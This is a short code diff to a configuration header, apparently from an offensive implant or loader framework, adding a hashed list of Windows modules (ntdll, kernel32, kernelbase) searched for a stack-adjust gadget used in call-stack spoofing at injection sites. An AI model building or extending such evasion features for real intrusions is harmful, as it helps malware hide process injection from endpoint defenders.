@@ -175,10 +175,24 @@
 
 // 0 = disabled
 // 1 = enabled — InitCallstackSpoof() runs in RunEvasionPatches(), locating
-//     `add rsp, 0x68; ret` in ntdll/kernel32. Use GetSpoofGadget() to fill
-//     SpoofContext::Gadget, then call SpoofCall() at injection sites.
+//     `add rsp, 0x68; ret` inside the module list below. Use GetSpoofGadget()
+//     to fill SpoofContext::Gadget, then call SpoofCall() at injection sites.
 #ifndef CONFIG_CALLSTACK_SPOOF_ENABLED
 #define CONFIG_CALLSTACK_SPOOF_ENABLED 0
+#endif
+
+// Gadget host modules, searched in order. Overridden by the builder via
+// the config.hpp Jinja render; this fallback mirrors the historical
+// ntdll/kernel32/kernelbase default for standalone builds that bypass the
+// template. Displacement is fixed at 0x68 (see callstack_spoof_gas.S).
+#ifndef CONFIG_CALLSTACK_SPOOF_MODULE_COUNT
+#define CONFIG_CALLSTACK_SPOOF_MODULE_COUNT 3
+#endif
+#ifndef CONFIG_CALLSTACK_SPOOF_MODULES
+#define CONFIG_CALLSTACK_SPOOF_MODULES \
+            erebus::HashStringFowlerNollVoVariant1a("ntdll.dll"), \
+            erebus::HashStringFowlerNollVoVariant1a("kernel32.dll"), \
+            erebus::HashStringFowlerNollVoVariant1a("kernelbase.dll")
 #endif
 
 // Helper function to get configured guardrails
